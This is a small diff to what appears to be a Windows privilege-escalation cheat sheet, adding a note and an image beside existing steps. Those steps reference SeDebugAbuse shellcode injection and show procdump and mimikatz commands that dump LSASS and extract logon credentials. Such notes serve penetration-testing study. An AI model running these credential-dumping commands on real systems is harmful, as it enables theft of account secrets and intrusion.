@@ -522,6 +522,9 @@ Run: SeDebugAbuse.exe <pid>. This will inject shellcode (you have to copy it int
 https://github.com/xct/SeDebugAbuse
 ```
 Gain NTLM Hash
+>If we are unable to load tools on the target for whatever reason
+<img width="836" height="323" alt="image" src="https://github.com/user-attachments/assets/a018cab1-cd0f-4586-bbbb-1a44cbfd90fc" />
+
 ```
 procdump.exe -accepteula -ma lsass.exe lsass.dmp
 mimikatz.exe
@@ -529,6 +532,7 @@ mimikatz.exe
 #sekurlsa::minidump C:\Tools\procdump\lsass.dmp
 #sekurlsa::logonpasswords
 ```
+
 ### PowerUp.ps1
 ```
 Service Enumeration:
